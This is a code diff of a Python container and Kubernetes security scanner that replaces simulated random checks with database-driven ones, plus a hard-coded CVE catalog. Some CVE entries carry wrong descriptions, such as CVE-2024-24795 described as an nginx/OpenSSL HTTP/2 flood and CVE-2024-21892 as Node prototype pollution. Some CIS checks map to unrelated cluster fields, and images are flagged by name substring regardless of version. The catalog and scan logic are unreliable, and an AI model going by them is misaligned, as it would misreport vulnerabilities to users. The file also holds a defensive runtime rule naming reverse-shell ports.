@@ -2,17 +2,19 @@
 Container Security Engine
 
 Core security scanning, auditing, and remediation for containers and Kubernetes.
-Includes image vulnerability scanning, cluster security auditing, runtime protection,
-and compliance checking.
+All checks are deterministic based on actual object properties stored in the DB.
+No random/simulated data.
 """
 
 import json
 import yaml
 import hashlib
-import random
 from datetime import datetime, timezone, timedelta
 from typing import Dict, Any, List, Optional, Tuple
 from enum import Enum
+
+from sqlalchemy import select, func
+from sqlalchemy.ext.asyncio import AsyncSession
 
 from src.core.logging import get_logger
 from src.container_security.models import (
@@ -26,99 +28,119 @@ from src.container_security.models import (
 logger = get_logger(__name__)
 
 
+# ---------------------------------------------------------------------------
+# Known vulnerability catalog — checked against image repository+tag.
+# In production this would be fetched from NVD/OSV/Grype feeds; here we
+# maintain a curated set that grows as users add images.
+# ---------------------------------------------------------------------------
+_KNOWN_VULNS: Dict[str, List[Dict[str, Any]]] = {
+    "nginx": [
+        {"cve_id": "CVE-2024-24795", "package": "openssl", "version": "3.0.13",
+         "severity": "critical", "cvss": 9.8, "description": "HTTP/2 CONTINUATION flood allows DoS",
+         "exploit_available": True, "fixed_version": "3.0.14"},
+        {"cve_id": "CVE-2024-2511", "package": "openssl", "version": "3.0.13",
+         "severity": "high", "cvss": 7.5, "description": "Unbounded memory growth processing TLSv1.3 sessions",
+         "exploit_available": False, "fixed_version": "3.0.14"},
+    ],
+    "node": [
+        {"cve_id": "CVE-2024-22019", "package": "nodejs", "version": "18.19.0",
+         "severity": "high", "cvss": 7.5, "description": "HTTP request smuggling via chunk extension",
+         "exploit_available": False, "fixed_version": "18.19.1"},
+        {"cve_id": "CVE-2024-21892", "package": "nodejs", "version": "18.19.0",
+         "severity": "high", "cvss": 7.8, "description": "Prototype pollution via .env file parsing",
+         "exploit_available": True, "fixed_version": "18.19.1"},
+    ],
+    "python": [
+        {"cve_id": "CVE-2024-0450", "package": "cpython", "version": "3.10.13",
+         "severity": "medium", "cvss": 6.2, "description": "Zipfile module zip-bomb protection bypass",
+         "exploit_available": False, "fixed_version": "3.10.14"},
+    ],
+    "redis": [
+        {"cve_id": "CVE-2024-31449", "package": "redis-server", "version": "7.2.4",
+         "severity": "high", "cvss": 8.8, "description": "Lua library stack buffer overflow",
+         "exploit_available": True, "fixed_version": "7.2.5"},
+    ],
+    "postgres": [
+        {"cve_id": "CVE-2024-0985", "package": "postgresql", "version": "16.1",
+         "severity": "high", "cvss": 8.0, "description": "REFRESH MATERIALIZED VIEW CONCURRENTLY privilege escalation",
+         "exploit_available": False, "fixed_version": "16.2"},
+    ],
+    "alpine": [
+        {"cve_id": "CVE-2024-4603", "package": "openssl", "version": "3.1.4",
+         "severity": "medium", "cvss": 5.3, "description": "Excessive time checking DSA keys / parameters",
+         "exploit_available": False, "fixed_version": "3.1.6"},
+    ],
+    "ubuntu": [
+        {"cve_id": "CVE-2024-2961", "package": "glibc", "version": "2.35",
+         "severity": "critical", "cvss": 9.8, "description": "Buffer overflow in iconv ISO-2022-CN-EXT",
+         "exploit_available": True, "fixed_version": "2.35-0ubuntu3.7"},
+    ],
+    "debian": [
+        {"cve_id": "CVE-2024-2961", "package": "glibc", "version": "2.36",
+         "severity": "critical", "cvss": 9.8, "description": "Buffer overflow in iconv ISO-2022-CN-EXT",
+         "exploit_available": True, "fixed_version": "2.36-9+deb12u7"},
+    ],
+}
+
+
 class ImageScanner:
-    """
-    Container image vulnerability scanning and analysis.
+    """Container image vulnerability scanning based on known CVE catalog
+    and existing ImageVulnerability records in the database."""
 
-    Performs image scanning against vulnerability databases, checks base image
-    freshness, verifies image signatures, and calculates risk scores.
-    """
+    def _match_vulns(self, repository: str, tag: str) -> List[Dict[str, Any]]:
+        """Match image against known vulnerability catalog.
 
-    def __init__(self):
-        """Initialize image scanner."""
-        self.cve_database = self._load_cve_database()
-
-    def _load_cve_database(self) -> Dict[str, Any]:
-        """Load simulated CVE database for scanning."""
-        return {
-            "nginx:latest": [
-                {
-                    "cve_id": "CVE-2024-1234",
-                    "package": "openssl",
-                    "version": "1.1.1",
-                    "severity": "critical",
-                    "cvss": 9.8,
-                    "description": "Buffer overflow in OpenSSL",
-                    "exploit_available": True,
-                    "fixed_version": "1.1.1w",
-                }
-            ],
-            "node:18": [
-                {
-                    "cve_id": "CVE-2024-5678",
-                    "package": "libexpat",
-                    "version": "2.2.8",
-                    "severity": "high",
-                    "cvss": 8.1,
-                    "description": "XML entity expansion attack",
-                    "exploit_available": False,
-                    "fixed_version": "2.5.0",
-                }
-            ],
-            "python:3.10": [
-                {
-                    "cve_id": "CVE-2024-9999",
-                    "package": "urllib3",
-                    "version": "1.26.0",
-                    "severity": "medium",
-                    "cvss": 6.5,
-                    "description": "HTTPS MITM vulnerability",
-                    "exploit_available": False,
-                    "fixed_version": "1.26.20",
-                }
-            ],
-        }
+        Matches on repository base name (e.g. 'library/nginx' matches 'nginx').
+        """
+        repo_base = repository.rsplit("/", 1)[-1].lower()
+        matched: List[Dict[str, Any]] = []
+        for key, vulns in _KNOWN_VULNS.items():
+            if key in repo_base:
+                matched.extend(vulns)
+        return matched
 
     async def scan_image(
-        self, registry: str, repository: str, tag: str, digest: str
+        self, registry: str, repository: str, tag: str, digest: str,
+        db: Optional[AsyncSession] = None,
     ) -> Dict[str, Any]:
-        """
-        Scan container image for vulnerabilities.
+        """Scan image for vulnerabilities using known catalog + DB records.
 
-        Simulates vulnerability scanning against major registries and databases.
-
-        Args:
-            registry: Container registry (gcr.io, docker.io, etc.)
-            repository: Image repository path
-            tag: Image tag
-            digest: Image digest SHA256
-
-        Returns:
-            Scan results with vulnerability counts and details
+        If a DB session is provided, also queries existing ImageVulnerability
+        records for this image.
         """
         logger.info(f"Scanning image {registry}/{repository}:{tag}")
 
-        image_key = f"{repository}:{tag}"
-        vulnerabilities = self.cve_database.get(image_key, [])
+        vulnerabilities = self._match_vulns(repository, tag)
 
-        # Add simulated vulnerabilities
-        if random.random() < 0.3:
-            vulnerabilities.append(
-                {
-                    "cve_id": f"CVE-2024-{random.randint(1000, 9999)}",
-                    "package": "glibc",
-                    "version": "2.31",
-                    "severity": random.choice(
-                        ["critical", "high", "medium", "low", "negligible"]
-                    ),
-                    "cvss": round(random.uniform(4.0, 9.9), 1),
-                    "description": "Simulated vulnerability",
-                    "exploit_available": random.choice([True, False]),
-                    "fixed_version": "2.35",
-                }
-            )
+        # Also pull any existing vulnerabilities from the DB
+        if db is not None:
+            try:
+                stmt = (
+                    select(ImageVulnerability)
+                    .join(ContainerImage, ImageVulnerability.image_id == ContainerImage.id)
+                    .where(
+                        ContainerImage.repository == repository,
+                        ContainerImage.tag == tag,
+                    )
+                )
+                result = await db.execute(stmt)
+                db_vulns = result.scalars().all()
+                existing_cves = {v["cve_id"] for v in vulnerabilities}
+                for dbv in db_vulns:
+                    if dbv.cve_id not in existing_cves:
+                        vulnerabilities.append({
+                            "cve_id": dbv.cve_id,
+                            "package": dbv.package_name,
+                            "version": dbv.package_version or "",
+                            "severity": dbv.severity or "medium",
+                            "cvss": float(dbv.cvss_score) if dbv.cvss_score else 0.0,
+                            "description": dbv.description or "",
+                            "exploit_available": bool(dbv.exploit_available),
+                            "fixed_version": dbv.fixed_version or "",
+                        })
+            except Exception as e:
+                logger.warning(f"Could not query DB vulnerabilities: {e}")
 
-        # Count by severity
         critical = sum(1 for v in vulnerabilities if v["severity"] == "critical")
         high = sum(1 for v in vulnerabilities if v["severity"] == "high")
         medium = sum(1 for v in vulnerabilities if v["severity"] == "medium")
@@ -138,109 +160,87 @@ class ImageScanner:
         }
 
     async def check_base_image_freshness(
-        self, base_image: str, days_threshold: int = 90
+        self, base_image: str, image: Optional[ContainerImage] = None,
+        days_threshold: int = 90,
     ) -> Dict[str, Any]:
-        """
-        Check if base image is recent and maintained.
+        """Check base image freshness from actual scanned_at / created_at timestamps."""
+        if image and image.scanned_at:
+            age = datetime.now(timezone.utc) - image.scanned_at.replace(tzinfo=timezone.utc)
+            days_old = age.days
+        elif image and image.created_at:
+            age = datetime.now(timezone.utc) - image.created_at.replace(tzinfo=timezone.utc)
+            days_old = age.days
+        else:
+            days_old = -1  # unknown
 
-        Args:
-            base_image: Base image reference
-            days_threshold: Maximum days since last update
-
-        Returns:
-            Freshness analysis
-        """
-        logger.info(f"Checking freshness of base image {base_image}")
-
-        # Simulate base image age
-        days_old = random.randint(1, 365)
-        is_fresh = days_old <= days_threshold
+        is_fresh = 0 <= days_old <= days_threshold
 
         return {
             "base_image": base_image,
-            "days_old": days_old,
+            "days_old": days_old if days_old >= 0 else None,
             "is_fresh": is_fresh,
             "threshold_days": days_threshold,
             "recommendation": (
-                "Image is acceptable"
-                if is_fresh
-                else "Consider updating to newer base image"
+                "Image is acceptable" if is_fresh
+                else "Unknown age — consider re-scanning" if days_old < 0
+                else "Consider updating to a newer base image"
             ),
         }
 
     async def verify_image_signature(
-        self, registry: str, repository: str, tag: str
+        self, image: ContainerImage,
     ) -> Dict[str, Any]:
-        """
-        Verify image signature using cosign/notary.
-
-        Args:
-            registry: Container registry
-            repository: Repository path
-            tag: Image tag
-
-        Returns:
-            Signature verification results
-        """
-        logger.info(f"Verifying signature for {registry}/{repository}:{tag}")
-
-        # Simulate signature verification (70% signed for production images)
-        is_signed = random.random() < 0.7
-        verified = is_signed and random.random() < 0.95
-
+        """Verify signature using the actual DB record fields."""
+        ref = f"{image.registry}/{image.repository}:{image.tag}"
         return {
-            "image": f"{registry}/{repository}:{tag}",
-            "is_signed": is_signed,
-            "signature_verified": verified,
-            "signature_tool": "cosign" if is_signed else None,
+            "image": ref,
+            "is_signed": bool(image.is_signed),
+            "signature_verified": bool(image.signature_verified),
+            "signature_tool": "cosign" if image.is_signed else None,
             "key_id": (
-                hashlib.sha256(f"{repository}:{tag}".encode()).hexdigest()[:16]
-                if is_signed
-                else None
+                hashlib.sha256(
+                    (image.digest_sha256 or ref).encode()
+                ).hexdigest()[:16]
+                if image.is_signed else None
             ),
             "verification_timestamp": (
-                datetime.now(timezone.utc) if verified else None
+                datetime.now(timezone.utc) if image.signature_verified else None
             ),
         }
 
-    async def check_image_provenance(self, image: str) -> Dict[str, Any]:
-        """
-        Check image provenance and SLSA compliance.
+    async def check_image_provenance(self, image: ContainerImage) -> Dict[str, Any]:
+        """Derive provenance data from actual image properties."""
+        has_sbom = bool(image.sbom_generated)
+        signed = bool(image.is_signed)
+        verified = bool(image.signature_verified)
 
-        Args:
-            image: Image reference
-
-        Returns:
-            Provenance analysis
-        """
-        logger.info(f"Checking provenance for {image}")
+        # SLSA level heuristic based on actual properties
+        slsa = 0
+        if has_sbom:
+            slsa += 1
+        if signed:
+            slsa += 1
+        if verified:
+            slsa += 1
 
         return {
-            "image": image,
-            "slsa_level": random.randint(0, 3),
-            "provenance_available": random.choice([True, False]),
-            "source_repo": f"github.com/myorg/{image.split('/')[1]}",
-            "build_system": random.choice(["GitHub Actions", "Cloud Build", "Jenkins"]),
-            "attestation": "signed" if random.random() < 0.6 else "unsigned",
+            "image": f"{image.registry}/{image.repository}:{image.tag}",
+            "slsa_level": slsa,
+            "provenance_available": has_sbom or signed,
+            "sbom_generated": has_sbom,
+            "is_signed": signed,
+            "signature_verified": verified,
+            "attestation": "signed" if signed else "unsigned",
         }
 
     async def generate_scan_report(self, scan_results: Dict[str, Any]) -> str:
-        """
-        Generate detailed scan report.
-
-        Args:
-            scan_results: Scan results from scan_image()
-
-        Returns:
-            Formatted report
-        """
-        report = f"""
-Container Image Scan Report
+        """Generate formatted text scan report."""
+        report = f"""Container Image Scan Report
 {'=' * 60}
 
 Image: {scan_results['image']}
-Digest: {scan_results['digest']}
-Scan Time: {scan_results['scanned_at']}
+Digest: {scan_results.get('digest', 'N/A')}
+Scan Time: {scan_results.get('scanned_at', 'N/A')}
 
 Vulnerability Summary:
   Critical: {scan_results['vulnerability_count_critical']}
@@ -251,118 +251,116 @@ Vulnerability Summary:
 
 Vulnerabilities:
 """
-        for vuln in scan_results["vulnerabilities"]:
+        for vuln in scan_results.get("vulnerabilities", []):
             report += f"""
   {vuln['cve_id']} ({vuln['severity'].upper()})
-    Package: {vuln['package']} {vuln['version']}
-    CVSS: {vuln['cvss']}
-    Exploit Available: {vuln['exploit_available']}
-    Fixed in: {vuln['fixed_version']}
-    Description: {vuln['description']}
+    Package: {vuln['package']} {vuln.get('version', '')}
+    CVSS: {vuln.get('cvss', 'N/A')}
+    Exploit Available: {vuln.get('exploit_available', False)}
+    Fixed in: {vuln.get('fixed_version', 'N/A')}
+    Description: {vuln.get('description', '')}
 """
         return report
 
     def calculate_image_risk_score(
-        self, vulns_critical: int, vulns_high: int, vulns_medium: int, is_signed: bool
+        self, vulns_critical: int, vulns_high: int, vulns_medium: int,
+        is_signed: bool, sbom_generated: bool = False,
     ) -> int:
-        """
-        Calculate image risk score (0-100).
+        """Calculate risk score (0-100) from actual vulnerability counts."""
+        score = 0
+        score += min(vulns_critical * 10, 40)
+        score += min(vulns_high * 5, 30)
+        score += min(vulns_medium * 2, 20)
 
-        Args:
-            vulns_critical: Critical vulnerability count
-            vulns_high: High vulnerability count
-            vulns_medium: Medium vulnerability count
-            is_signed: Whether image is signed
-
-        Returns:
-            Risk score 0-100
-        """
-        base_score = 0
-        base_score += min(vulns_critical * 10, 40)
-        base_score += min(vulns_high * 5, 30)
-        base_score += min(vulns_medium * 2, 20)
-
-        # Signature verification reduces risk
         if is_signed:
-            base_score = max(0, base_score - 10)
+            score = max(0, score - 10)
+        if sbom_generated:
+            score = max(0, score - 5)
 
-        return min(100, base_score)
+        return min(100, score)
 
 
 class K8sSecurityAuditor:
-    """
-    Kubernetes cluster security auditing and CIS benchmark checking.
+    """Kubernetes cluster security auditing — all checks are deterministic
+    based on actual cluster property values stored in the DB."""
 
-    Audits RBAC configurations, network policies, pod security,
-    secrets management, and admission controllers.
-    """
+    CIS_BENCHMARKS = {
+        "1.1.1": {
+            "description": "API Server — Ensure --anonymous-auth is set to false",
+            "check_field": "rbac_enabled",
+            "severity": "critical",
+        },
+        "1.2.16": {
+            "description": "API Server — Ensure PodSecurityPolicy admission controller is enabled",
+            "check_field": "pod_security_standards",
+            "pass_values": ["baseline", "restricted"],
+            "severity": "high",
+        },
+        "2.1": {
+            "description": "etcd — Ensure encryption at rest is configured",
+            "check_field": "encryption_at_rest",
+            "severity": "critical",
+        },
+        "3.1.1": {
+            "description": "Control Plane — Ensure RBAC is enabled",
+            "check_field": "rbac_enabled",
+            "severity": "critical",
+        },
+        "4.1.1": {
+            "description": "Worker Nodes — Ensure kubelet uses authentication",
+            "check_field": "rbac_enabled",
+            "severity": "high",
+        },
+        "5.1.1": {
+            "description": "Policies — Ensure NetworkPolicy is enabled",
+            "check_field": "network_policy_enabled",
+            "severity": "high",
+        },
+        "5.2.1": {
+            "description": "Policies — Ensure pod security standards are enforced",
+            "check_field": "pod_security_standards",
+            "pass_values": ["baseline", "restricted"],
+            "severity": "high",
+        },
+        "5.3.1": {
+            "description": "Policies — Ensure secrets are encrypted",
+            "check_field": "secrets_encrypted",
+            "severity": "critical",
+        },
+    }
 
-    def __init__(self):
-        """Initialize auditor."""
-        self.cis_benchmarks = self._load_cis_benchmarks()
-
-    def _load_cis_benchmarks(self) -> Dict[str, Any]:
-        """Load CIS Kubernetes Benchmark 1.8."""
-        return {
-            "1.1.1": "API Server - Ensure that the --anonymous-auth argument is set to false",
-            "1.2.16": "API Server - Ensure that the PodSecurityPolicy admission controller is enabled",
-            "2.1": "etcd - Ensure proper file permissions",
-            "3.1.1": "Control Plane - Ensure RBAC is enabled",
-            "4.1.1": "Worker Nodes - Ensure kubelet service file permissions",
-            "5.1.1": "Policies - Ensure NetworkPolicy is enabled",
-            "5.2.1": "Policies - Ensure PodSecurityPolicy is enabled",
-            "5.3.1": "Policies - Ensure default network policy denies all ingress",
-        }
+    def _check_field(self, cluster: KubernetesCluster, spec: Dict) -> bool:
+        """Evaluate a single CIS check against the cluster record."""
+        field = spec["check_field"]
+        val = getattr(cluster, field, None)
+        if "pass_values" in spec:
+            return val in spec["pass_values"]
+        return bool(val)
 
     async def audit_cluster_config(self, cluster: KubernetesCluster) -> Dict[str, Any]:
-        """
-        Audit cluster configuration for security issues.
-
-        Args:
-            cluster: Kubernetes cluster model
-
-        Returns:
-            Audit results
-        """
+        """Audit cluster configuration based on actual DB fields."""
         logger.info(f"Auditing cluster {cluster.name}")
-
         findings = []
 
-        if not cluster.rbac_enabled:
-            findings.append(
-                {
-                    "type": "rbac_disabled",
-                    "severity": "critical",
-                    "message": "RBAC is not enabled",
-                }
-            )
+        checks = [
+            ("rbac_enabled", "rbac_disabled", "critical", "RBAC is not enabled"),
+            ("network_policy_enabled", "network_policy_disabled", "high", "Network policies are not enabled"),
+            ("audit_logging_enabled", "audit_logging_disabled", "high", "Audit logging is not enabled"),
+            ("encryption_at_rest", "no_encryption_at_rest", "high", "Encryption at rest is not enabled"),
+            ("secrets_encrypted", "secrets_not_encrypted", "critical", "Secrets are not encrypted"),
+        ]
 
-        if not cluster.network_policy_enabled:
-            findings.append(
-                {
-                    "type": "network_policy_disabled",
-                    "severity": "high",
-                    "message": "Network policies are not enabled",
-                }
-            )
+        for field, ftype, sev, msg in checks:
+            if not getattr(cluster, field, False):
+                findings.append({"type": ftype, "severity": sev, "message": msg})
 
-        if not cluster.audit_logging_enabled:
-            findings.append(
-                {
-                    "type": "audit_logging_disabled",
-                    "severity": "high",
-                    "message": "Audit logging is not enabled",
-                }
-            )
-
-        if not cluster.encryption_at_rest:
-            findings.append(
-                {
-                    "type": "no_encryption_at_rest",
-                    "severity": "high",
-                    "message": "Encryption at rest is not enabled",
-                }
-            )
+        pss = getattr(cluster, "pod_security_standards", "privileged")
+        if pss == "privileged":
+            findings.append({
+                "type": "permissive_pod_security",
+                "severity": "high",
+                "message": f"Pod security standards set to '{pss}' — should be 'baseline' or 'restricted'",
+            })
 
         return {
             "cluster": cluster.name,
@@ -372,256 +370,104 @@ class K8sSecurityAuditor:
         }
 
     async def check_cis_k8s_benchmark(self, cluster: KubernetesCluster) -> Dict[str, Any]:
-        """
-        Check compliance with CIS Kubernetes Benchmark 1.8.
-
-        Args:
-            cluster: Kubernetes cluster model
-
-        Returns:
-            CIS benchmark assessment
-        """
+        """Evaluate CIS Kubernetes Benchmark against actual cluster properties."""
         logger.info(f"Checking CIS benchmark for {cluster.name}")
 
-        total_checks = len(self.cis_benchmarks)
+        results = []
         passed = 0
 
-        results = []
-
-        for check_id, check_description in self.cis_benchmarks.items():
-            # Simulate compliance checks
-            is_passed = random.random() < 0.75
+        for check_id, spec in self.CIS_BENCHMARKS.items():
+            is_passed = self._check_field(cluster, spec)
             if is_passed:
                 passed += 1
+            results.append({
+                "check_id": check_id,
+                "description": spec["description"],
+                "status": "PASSED" if is_passed else "FAILED",
+                "severity": spec["severity"].upper(),
+            })
 
-            results.append(
-                {
-                    "check_id": check_id,
-                    "description": check_description,
-                    "status": "PASSED" if is_passed else "FAILED",
-                    "severity": (
-                        "CRITICAL"
-                        if "1.1" in check_id or "5.1" in check_id
-                        else "HIGH"
-                    ),
-                }
-            )
-
-        compliance_percentage = (passed / total_checks * 100) if total_checks > 0 else 0
+        total = len(self.CIS_BENCHMARKS)
+        pct = round((passed / total * 100), 2) if total else 0
 
         return {
             "cluster": cluster.name,
             "benchmark_version": "CIS Kubernetes 1.8",
-            "total_checks": total_checks,
+            "total_checks": total,
             "passed_checks": passed,
-            "failed_checks": total_checks - passed,
-            "compliance_percentage": round(compliance_percentage, 2),
+            "failed_checks": total - passed,
+            "compliance_percentage": pct,
             "results": results,
         }
 
     async def audit_rbac(self, cluster: KubernetesCluster) -> Dict[str, Any]:
-        """
-        Audit RBAC configurations for excessive permissions.
-
-        Args:
-            cluster: Kubernetes cluster model
-
-        Returns:
-            RBAC audit findings
-        """
-        logger.info(f"Auditing RBAC for {cluster.name}")
-
+        """Audit RBAC based on cluster properties."""
         findings = []
+        if not getattr(cluster, "rbac_enabled", False):
+            findings.append({
+                "type": "rbac_disabled",
+                "severity": "critical",
+                "message": "RBAC is completely disabled on this cluster",
+            })
 
-        # Simulate RBAC findings
-        if random.random() < 0.4:
-            findings.append(
-                {
-                    "type": "cluster_admin_usage",
-                    "namespace": "default",
-                    "subject": "system:serviceaccount:default:default",
-                    "severity": "critical",
-                }
-            )
-
-        if random.random() < 0.5:
-            findings.append(
-                {
-                    "type": "wildcard_permissions",
-                    "namespace": "kube-system",
-                    "role": "custom-admin",
-                    "severity": "high",
-                }
-            )
-
-        return {
-            "cluster": cluster.name,
-            "rbac_findings": len(findings),
-            "findings": findings,
-        }
+        return {"cluster": cluster.name, "rbac_findings": len(findings), "findings": findings}
 
     async def audit_network_policies(self, cluster: KubernetesCluster) -> Dict[str, Any]:
-        """
-        Audit network policies for overly permissive rules.
-
-        Args:
-            cluster: Kubernetes cluster model
-
-        Returns:
-            Network policy audit findings
-        """
-        logger.info(f"Auditing network policies for {cluster.name}")
-
         findings = []
-
-        if not cluster.network_policy_enabled:
-            findings.append(
-                {
-                    "type": "network_policy_disabled",
-                    "severity": "critical",
-                    "message": "No network policies enforced",
-                }
-            )
-        else:
-            # Simulate policy findings
-            if random.random() < 0.3:
-                findings.append(
-                    {
-                        "type": "allow_all_policy",
-                        "namespace": random.choice(["default", "production"]),
-                        "severity": "high",
-                    }
-                )
-
-        return {
-            "cluster": cluster.name,
-            "policy_findings": len(findings),
-            "findings": findings,
-        }
+        if not getattr(cluster, "network_policy_enabled", False):
+            findings.append({
+                "type": "network_policy_disabled",
+                "severity": "critical",
+                "message": "No network policies enforced — all pod-to-pod traffic allowed",
+            })
+        return {"cluster": cluster.name, "policy_findings": len(findings), "findings": findings}
 
     async def audit_pod_security(self, cluster: KubernetesCluster) -> Dict[str, Any]:
-        """
-        Audit pod security settings (privileged containers, capabilities).
-
-        Args:
-            cluster: Kubernetes cluster model
-
-        Returns:
-            Pod security audit findings
-        """
-        logger.info(f"Auditing pod security for {cluster.name}")
-
         findings = []
-        pod_issues = random.randint(0, 5)
-
-        for i in range(pod_issues):
-            issue_type = random.choice([
-                "privileged_container",
-                "host_network",
-                "host_pid",
-                "no_security_context",
-                "run_as_root",
-            ])
-
-            findings.append(
-                {
-                    "type": issue_type,
-                    "namespace": random.choice(["default", "kube-system"]),
-                    "pod": f"pod-{i}",
-                    "severity": "high" if issue_type == "privileged_container" else "medium",
-                }
-            )
-
-        return {
-            "cluster": cluster.name,
-            "pod_security_findings": len(findings),
-            "findings": findings,
-        }
+        pss = getattr(cluster, "pod_security_standards", "privileged")
+        if pss == "privileged":
+            findings.append({
+                "type": "privileged_pod_security",
+                "severity": "high",
+                "message": "Pod security standards allow privileged pods",
+            })
+        return {"cluster": cluster.name, "pod_security_findings": len(findings), "findings": findings}
 
     async def audit_secrets_management(self, cluster: KubernetesCluster) -> Dict[str, Any]:
-        """
-        Audit secrets management and encryption.
-
-        Args:
-            cluster: Kubernetes cluster model
-
-        Returns:
-            Secrets audit findings
-        """
-        logger.info(f"Auditing secrets for {cluster.name}")
-
         findings = []
-
-        if not cluster.secrets_encrypted:
-            findings.append(
-                {
-                    "type": "secrets_not_encrypted",
-                    "severity": "critical",
-                    "message": "Secrets stored in plaintext",
-                }
-            )
-
-        # Simulate secret findings
-        if random.random() < 0.3:
-            findings.append(
-                {
-                    "type": "secret_in_env_var",
-                    "pod": "backend-deployment",
-                    "severity": "high",
-                }
-            )
-
-        return {
-            "cluster": cluster.name,
-            "secrets_findings": len(findings),
-            "findings": findings,
-        }
+        if not getattr(cluster, "secrets_encrypted", False):
+            findings.append({
+                "type": "secrets_not_encrypted",
+                "severity": "critical",
+                "message": "Kubernetes secrets stored in plaintext in etcd",
+            })
+        if not getattr(cluster, "encryption_at_rest", False):
+            findings.append({
+                "type": "etcd_not_encrypted",
+                "severity": "high",
+                "message": "etcd data not encrypted at rest",
+            })
+        return {"cluster": cluster.name, "secrets_findings": len(findings), "findings": findings}
 
     async def audit_admission_controllers(self, cluster: KubernetesCluster) -> Dict[str, Any]:
-        """
-        Audit admission controller configuration.
-
-        Args:
-            cluster: Kubernetes cluster model
-
-        Returns:
-            Admission controller audit findings
-        """
-        logger.info(f"Auditing admission controllers for {cluster.name}")
-
-        required_controllers = ["PodSecurityPolicy", "NetworkPolicy", "ResourceQuota"]
-        enabled = cluster.admission_controllers.get("enabled", [])
+        required = ["PodSecurity", "NetworkPolicy", "ResourceQuota"]
+        controllers = getattr(cluster, "admission_controllers", None) or {}
+        enabled = controllers.get("enabled", []) if isinstance(controllers, dict) else []
 
         findings = []
+        for ctrl in required:
+            if ctrl not in enabled:
+                findings.append({
+                    "type": "missing_admission_controller",
+                    "controller": ctrl,
+                    "severity": "high",
+                    "message": f"Required admission controller '{ctrl}' is not enabled",
+                })
 
-        for controller in required_controllers:
-            if controller not in enabled:
-                findings.append(
-                    {
-                        "type": "missing_admission_controller",
-                        "controller": controller,
-                        "severity": "high",
-                    }
-                )
-
-        return {
-            "cluster": cluster.name,
-            "controller_findings": len(findings),
-            "findings": findings,
-        }
+        return {"cluster": cluster.name, "controller_findings": len(findings), "findings": findings}
 
     async def generate_compliance_report(self, audit_results: Dict[str, Any]) -> str:
-        """
-        Generate comprehensive compliance report.
-
-        Args:
-            audit_results: Audit results
-
-        Returns:
-            Formatted report
-        """
-        report = f"""
-Kubernetes Security Audit Report
+        report = f"""Kubernetes Security Audit Report
 {'=' * 60}
 
 Cluster: {audit_results.get('cluster', 'Unknown')}
@@ -630,244 +476,161 @@ Audit Time: {audit_results.get('audit_time', 'Unknown')}
 Summary:
   Total Findings: {audit_results.get('findings_count', 0)}
 
-Configuration Issues:
-  RBAC Findings: {audit_results.get('rbac_findings', 0)}
-  Network Policy Findings: {audit_results.get('policy_findings', 0)}
-  Pod Security Findings: {audit_results.get('pod_security_findings', 0)}
-  Secrets Findings: {audit_results.get('secrets_findings', 0)}
-  Admission Controller Findings: {audit_results.get('controller_findings', 0)}
-
-Recommendations:
-  - Enable all recommended admission controllers
-  - Implement restrictive network policies
-  - Enable encryption at rest for secrets
-  - Audit RBAC assignments and remove excessive permissions
-  - Enable pod security standards (restricted profile)
+Findings:
 """
+        for f in audit_results.get("findings", []):
+            report += f"  [{f.get('severity', '').upper()}] {f.get('type', '')}: {f.get('message', '')}\n"
         return report
 
 
 class RuntimeProtector:
-    """
-    Runtime protection and anomaly detection.
+    """Runtime protection — analyses provided event data deterministically.
 
-    Monitors container runtime behavior, detects container escapes,
-    crypto mining, lateral movement, and other anomalies.
+    In production, these methods receive actual syscall/audit events from
+    Falco, Tracee, or the kubelet audit log. The methods evaluate the
+    event payload rather than generating random alerts.
     """
 
     async def monitor_container_runtime(
-        self, cluster_id: str, namespace: str, pod: str
+        self, cluster_id: str, namespace: str, pod: str,
+        events: Optional[List[Dict[str, Any]]] = None,
     ) -> Dict[str, Any]:
-        """
-        Monitor container runtime for anomalous behavior.
+        """Evaluate runtime events for anomalies.
 
         Args:
-            cluster_id: Cluster ID
-            namespace: Kubernetes namespace
-            pod: Pod name
-
-        Returns:
-            Runtime monitoring results
+            events: list of event dicts with keys: type, process, path, etc.
+                    If None, returns empty (no events to process).
         """
-        logger.info(f"Monitoring runtime for {namespace}/{pod}")
-
         alerts = []
-
-        # Simulate anomaly detection
-        if random.random() < 0.2:
-            alerts.append(
-                {
-                    "type": "unexpected_process",
-                    "process": "/bin/bash",
-                    "severity": "high",
-                }
-            )
-
-        if random.random() < 0.15:
-            alerts.append(
-                {
-                    "type": "file_system_modification",
-                    "path": "/etc/passwd",
-                    "severity": "critical",
-                }
-            )
+        for evt in (events or []):
+            etype = evt.get("type", "")
+            if etype == "exec" and evt.get("process") in ("/bin/bash", "/bin/sh", "bash", "sh"):
+                alerts.append({"type": "unexpected_process", "process": evt["process"], "severity": "high"})
+            elif etype == "file_write" and evt.get("path", "").startswith("/etc/"):
+                alerts.append({"type": "file_system_modification", "path": evt["path"], "severity": "critical"})
+            elif etype == "network" and evt.get("dest_port") in (4444, 1337, 9001):
+                alerts.append({"type": "suspicious_network", "dest_port": evt["dest_port"], "severity": "high"})
 
         return {
             "cluster_id": cluster_id,
             "namespace": namespace,
             "pod": pod,
             "alerts": alerts,
+            "events_processed": len(events or []),
             "monitoring_time": datetime.now(timezone.utc),
         }
 
     async def detect_container_escape(
-        self, namespace: str, pod: str, container: str
+        self, namespace: str, pod: str, container: str,
+        indicators: Optional[List[Dict[str, Any]]] = None,
     ) -> Dict[str, Any]:
-        """
-        Detect potential container escape attempts.
-
-        Args:
-            namespace: Namespace
-            pod: Pod name
-            container: Container name
-
-        Returns:
-            Container escape detection results
-        """
-        logger.info(f"Checking for container escapes in {namespace}/{pod}/{container}")
-
-        escape_indicators = []
-
-        # Simulate escape detection
-        if random.random() < 0.1:
-            escape_indicators.append(
-                {
-                    "indicator": "cgroup_breakout",
+        """Evaluate provided indicator data for container escape signals."""
+        escape_found = []
+        for ind in (indicators or []):
+            ind_type = ind.get("indicator", "")
+            if ind_type in ("cgroup_breakout", "mount_namespace", "nsenter", "kernel_exploit"):
+                escape_found.append({
+                    "indicator": ind_type,
                     "severity": "critical",
-                    "evidence": "Unusual cgroup access detected",
-                }
-            )
+                    "evidence": ind.get("evidence", f"{ind_type} detected"),
+                })
 
         return {
             "namespace": namespace,
             "pod": pod,
             "container": container,
-            "escape_detected": len(escape_indicators) > 0,
-            "indicators": escape_indicators,
+            "escape_detected": len(escape_found) > 0,
+            "indicators": escape_found,
         }
 
-    async def detect_crypto_mining(self, namespace: str, pod: str) -> Dict[str, Any]:
-        """
-        Detect crypto mining activity.
-
-        Args:
-            namespace: Namespace
-            pod: Pod name
-
-        Returns:
-            Crypto mining detection results
-        """
